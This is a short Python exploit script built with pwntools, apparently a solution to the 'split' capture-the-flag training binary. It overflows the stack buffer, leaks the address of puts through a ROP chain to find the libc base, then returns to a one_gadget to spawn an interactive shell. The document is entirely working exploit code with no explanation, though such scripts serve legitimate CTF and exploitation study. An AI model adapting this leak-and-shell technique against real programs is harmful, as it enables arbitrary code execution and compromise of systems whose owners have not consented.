#!/usr/bin/python 
from pwn import *

p = process("./split")
elf = ELF("./split")
p1ret = 0x400883
libc = elf.libc 

pay = 'A'*(0x20 + 0x8)
pay += p64(p1ret) + p64(elf.got['puts']) + p64(elf.plt['puts'])
pay += p64(elf.symbols['pwnme'])

p.sendlineafter("> ", pay)

puts = u64(p.recvuntil('\x7f') + '\x00\x00')
libcBase = puts - libc.symbols['puts']
one_gadget = libcBase + 0x4526a
log.info("puts : "+hex(puts))

p.sendlineafter("> ", 'A'*(0x20 + 0x8) + p64(one_gadget))

p.interactive()
